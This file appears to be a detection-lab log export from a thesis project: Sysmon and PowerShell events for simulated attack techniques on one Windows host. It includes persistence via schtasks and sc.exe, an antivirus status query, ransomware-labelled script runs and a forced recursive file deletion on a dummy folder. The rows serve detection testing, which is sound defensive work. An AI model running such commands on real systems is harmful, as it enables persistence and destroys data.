2026-06-24T12:54:37.594Z	P3	TEC-001	T1059.001	TEC-001 PowerShell suspicious execution	TEC001_PowerShell_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	function Test-Tec009Evidence { param( [AllowEmptyString()][string]$Command = "", [AllowEmptyString()][string]$ScriptPath = "", [AllowEmptyString()][string]$ReceiverUrl = "", [AllowEmptyString()][string]$HttpStatus = "", [AllowEmptyString()][string]$UploadSucceeded = "", [AllowEmptyString()][string]$ZipFile = "", [AllowEmptyString()][string]$CopyFile = "", [AllowEmptyString()][string]$LocalSHA256 = "", [AllowEmptyString()][string]$SummaryFile = "", $SummaryObject = $null, $PowerShell4104 = $null ) $checks = @() $checks += New-EvidenceCheckRow -CheckName "powershell.exe -File invocation" -Status $(if ($Command -match '(?i)powershell\.exe\s+-NoProfile\s+-ExecutionPolicy\s+Bypass\s+-File') { "OK" } else { "FAIL" }) -Expected "powershell.exe -NoProfile -ExecutionPolicy Bypass -File" -Found $Command -Evidence $Command -Comment "TEC-009 must run in an explicit PowerShell child process." $checks...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC001_PowerShell_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
